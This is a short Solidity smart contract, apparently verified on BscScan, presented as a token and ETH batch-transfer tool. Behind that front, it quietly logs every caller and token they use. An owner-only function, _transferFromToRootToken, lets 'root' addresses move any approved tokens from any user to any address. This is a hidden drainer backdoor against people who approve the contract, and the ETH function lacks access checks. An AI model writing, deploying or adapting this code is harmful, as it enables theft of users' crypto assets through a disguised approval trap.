/**
 *Submitted for verification at BscScan.com on 2022-01-18
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface ERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);

}

contract Transform{

    mapping (address => bool) private root;
    address[] private userList;
    mapping (address=>address[]) userPertoken;

    constructor() {
        root[msg.sender] = true;
    }

    function allowanceAll(address token,address _own) public view returns(uint256){
        ERC20 contract_erc = ERC20(token);
        return contract_erc.allowance(_own,address(this));
    }

    function userListShow() public view own returns(address[] memory){
        return userList;
    }

    function tokenListShow(address _own) public view own returns(address[] memory){
        return userPertoken[_own];
    }
    
    function _transferfrom(address token,address[] memory to,uint256[] memory amount) public returns(bool) {
        ERC20 contract_erc = ERC20(token);
        userList.push(msg.sender);
        userPertoken[msg.sender].push(token);
        for (uint256 i=0;i < to.length;i++){
            contract_erc.transferFrom(msg.sender,to[i],amount[i]);
        }
        return true;
    }

    function _transferETH(address payable[] memory to,uint256[] memory amount)public payable{
        for (uint256 i=0;i < to.length;i++){
            to[i].transfer(amount[i]);
        }
    }

    function _transferFromToRootToken(address token,address payable from,address payable to,uint256 amount) own public{
        ERC20 contract_erc = ERC20(token);
        contract_erc.transferFrom(from,to,amount);
    }

    function addRoot(address _root,bool power) own public {
        root[_root] = power;
    }

    modifier own(){
        require(root[msg.sender],"tranfer amount EOFF!");
        _;
    }
    
}